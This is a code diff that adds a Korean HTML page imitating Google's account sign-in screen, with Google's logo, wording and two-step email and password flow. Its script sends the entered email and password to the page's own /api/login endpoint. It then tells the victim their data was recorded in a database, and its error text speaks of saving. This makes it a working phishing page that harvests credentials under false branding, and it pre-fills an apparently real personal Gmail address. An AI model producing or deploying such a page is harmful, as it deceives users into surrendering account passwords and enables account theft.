@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>로그인 - Google 계정</title>
+    <style>
+        body {
+            font-family: 'Roboto', 'Noto Sans KR', Arial, sans-serif;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 450px;
+            padding: 40px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            background-color: #fff;
+            text-align: center;
+        }
+        .logo {
+            font-family: 'Product Sans', 'Roboto', sans-serif;
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 6px;
+        }
+        .logo .c1 { color: #4285F4; }
+        .logo .c2 { color: #EA4335; }
+        .logo .c3 { color: #FBBC05; }
+        .logo .c4 { color: #4285F4; }
+        .logo .c5 { color: #34A853; }
+        .logo .c6 { color: #EA4335; }
+
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        .input-box {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-box input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        .input-box input:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px;
+        }
+        .link-text {
+            text-align: left;
+            margin-bottom: 40px;
+        }
+        .link-text a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .link-text a:hover {
+            text-decoration: underline;
+        }
+        .footer-text {
+            font-size: 13px;
+            color: #5f6368;
+            text-align: left;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .btn-create {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .btn-create:hover {
+            text-decoration: underline;
+        }
+        .btn-next {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .btn-next:hover {
+            background-color: #1b66c9;
+        }
+        .account-chip {
+            display: inline-flex;
+            align-items: center;
+            border: 1px solid #dadce0;
+            border-radius: 100px;
+            padding: 4px 12px 4px 4px;
+            margin-bottom: 30px;
+            font-size: 14px;
+            color: #202124;
+            max-width: 100%;
+        }
+        .account-avatar {
+            width: 20px;
+            height: 20px;
+            background-color: #1a73e8;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 11px;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+        .account-email {
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        .show-password {
+            text-align: left;
+            margin-bottom: 40px;
+            font-size: 14px;
+            color: #202124;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        .show-password input {
+            margin-right: 8px;
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .hidden {
+            display: none;
+        }
+        
+        /* [추가] 로그인 성공 후 메인 화면 스타일 */
+        .dashboard-container {
+            width: 500px;
+            padding: 40px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            background-color: #fff;
+            text-align: center;
+        }
+        .welcome-title {
+            font-size: 22px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 15px;
+        }
+        .welcome-desc {
+            font-size: 15px;
+            color: #5f6368;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        .btn-logout {
+            background-color: #f1f3f4;
+            color: #3c4043;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .btn-logout:hover {
+            background-color: #e8eaed;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1. 로그인 프로세스 박스 -->
+    <div class="container" id="login-box">
+        <!-- Google 로고 -->
+        <div class="logo">
+            <span class="c1">G</span><span class="c2">o</span><span class="c3">o</span><span class="c4">g</span><span class="c5">l</span><span class="c6">e</span>
+        </div>
+
+        <!-- [단계 1] 이메일 입력 화면 -->
+        <div id="step-email">
+            <div class="title">로그인</div>
+            <div class="subtitle">Google 계정 사용</div>
+
+            <form onsubmit="handleEmailNext(event);">
+                <div class="input-box">
+                    <input type="text" id="email-input" placeholder="휴대폰 번호 또는 이메일" required value="bboyeonwoo@gmail.com">
+                </div>
+
+                <div class="link-text">
+                    <a href="#">이메일을 잊으셨나요?</a>
+                </div>
+
+                <div class="footer-text">
+                    내 컴퓨터가 아닙니다. 게스트 모드를 사용하여 비공개로 로그인하세요. <a href="#" style="color: #1a73e8; text-decoration: none;">자세히 알아보기</a>
+                </div>
+
+                <div class="button-group">
+                    <a href="#" class="btn-create">계정 만들기</a>
+                    <button type="submit" class="btn-next">다음</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- [단계 2] 비밀번호 입력 화면 -->
+        <div id="step-password" class="hidden">
+            <div class="title">환영합니다</div>
+
+            <div class="account-chip">
+                <div class="account-avatar" id="avatar-letter">B</div>
+                <span class="account-email" id="display-email">bboyeonwoo@gmail.com</span>
+            </div>
+
+            <form onsubmit="handlePasswordSubmit(event);">
+                <div class="input-box">
+                    <input type="password" id="password-input" placeholder="비밀번호 입력" required>
+                </div>
+
+                <div class="show-password">
+                    <input type="checkbox" id="show-pwd" onclick="togglePassword(this)">
+                    <label for="show-pwd" style="cursor: pointer;">비밀번호 표시</label>
+                </div>
+
+                <div class="button-group">
+                    <a href="#" class="btn-create">비밀번호를 잊으셨나요?</a>
+                    <button type="submit" class="btn-next">다음</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- 2. [추가] 로그인 성공 후 보여질 메인 화면 (처음엔 숨김) -->
+    <div class="dashboard-container hidden" id="dashboard-box">
+        <div class="logo" style="margin-bottom: 20px;">
+            <span class="c1">G</span><span class="c2">o</span><span class="c3">o</span><span class="c4">g</span><span class="c5">l</span><span class="c6">e</span>
+        </div>
+        <div class="welcome-title" id="welcome-msg">로그인 성공!</div>
+        <div class="welcome-desc">
+            성공적으로 인증되었습니다.<br>
+            데이터베이스에 정보가 안전하게 기록되었습니다.
+        </div>
+        <button class="btn-logout" onclick="handleLogout()">로그아웃</button>
+    </div>
+
+    <script>
+        let userEmail = "";
+
+        function handleEmailNext(event) {
+            event.preventDefault();
+            const emailInput = document.getElementById('email-input').value;
+            userEmail = emailInput;
+
+            document.getElementById('display-email').innerText = userEmail;
+            if (userEmail.length > 0) {
+                document.getElementById('avatar-letter').innerText = userEmail.charAt(0).toUpperCase();
+            }
+
+            document.getElementById('step-email').classList.add('hidden');
+            document.getElementById('step-password').classList.remove('hidden');
+        }
+
+        function togglePassword(checkbox) {
+            const pwdInput = document.getElementById('password-input');
+            pwdInput.type = checkbox.checked ? 'text' : 'password';
+        }
+
+        async function handlePasswordSubmit(event) {
+            event.preventDefault();
+            const passwordInput = document.getElementById('password-input').value;
+
+            const loginData = {
+                email: userEmail,
+                password: passwordInput
+            };
+
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(loginData)
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    // 로그인 성공 시 로그인 박스를 숨기고 메인 화면을 표시
+                    document.getElementById('login-box').classList.add('hidden');
+                    document.getElementById('welcome-msg').innerText = `${userEmail}님 환영합니다!`;
+                    document.getElementById('dashboard-box').classList.remove('hidden');
+                } else {
+                    alert('저장 실패: ' + result.message);
+                }
+            } catch (error) {
+                console.error('서버 통신 에러:', error);
+                alert('서버와 연결할 수 없습니다.');
+            }
+        }
+
+        function handleLogout() {
+            // 로그아웃 시 다시 초기 로그인 화면으로 돌아가기
+            document.getElementById('dashboard-box').classList.add('hidden');
+            document.getElementById('step-password').classList.add('hidden');
+            document.getElementById('step-email').classList.remove('hidden');
+            document.getElementById('login-box').classList.remove('hidden');
+            document.getElementById('password-input').value = "";
+        }
+    </script>
+
+</body>
+</html>
